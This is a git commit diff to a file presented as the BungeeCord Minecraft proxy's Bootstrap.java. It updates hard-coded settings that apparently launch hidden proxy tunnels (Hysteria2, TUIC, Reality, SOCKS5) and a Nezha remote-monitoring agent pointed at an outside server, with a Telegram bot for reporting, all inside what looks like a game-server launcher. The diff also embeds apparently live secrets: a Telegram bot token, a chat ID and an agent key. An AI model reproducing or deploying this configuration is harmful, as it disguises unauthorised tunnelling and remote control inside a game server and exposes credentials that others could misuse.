481c77c954a706bf1e73b60fa81fae36d72d055d
pingmike2 <166621491+pingmike2@users.noreply.github.com>
2026-02-15 23:41:46 +0800

    Update NEZHA_KEY and port configurations

--- bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
+++ bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
@@ -98,19 +98,21 @@ public class Bootstrap
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "6rfgt8VuJcQCTDxu88");
+        envVars.put("NEZHA_KEY", "4ye75OmhG2duIQbc50");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "21777");
-        envVars.put("TUIC_PORT", "21778");
-        envVars.put("REALITY_PORT", "21778");
+        envVars.put("HY2_PORT", "20114");
+        envVars.put("S5_PORT", "20213");
+        envVars.put("TUIC_PORT", "20245");
+        envVars.put("REALITY_PORT", "20329");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "7592034407");
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "104.17.97.5");
         envVars.put("CFPORT", "2096");
         envVars.put("NAME", "lemehost");
+        envVars.put("DISABLE_ARGO", "true");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
